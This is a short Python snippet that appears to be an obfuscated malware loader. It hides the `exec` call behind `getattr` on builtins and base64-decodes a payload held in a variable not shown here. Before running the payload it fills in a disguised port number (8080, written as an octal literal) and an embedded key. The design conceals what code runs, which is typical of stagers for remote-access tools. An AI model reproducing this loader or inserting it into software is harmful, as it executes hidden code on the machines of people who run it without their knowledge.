import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "7aaf8f34-cb91-4a46-a02f-39cfb0e3fdcc")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)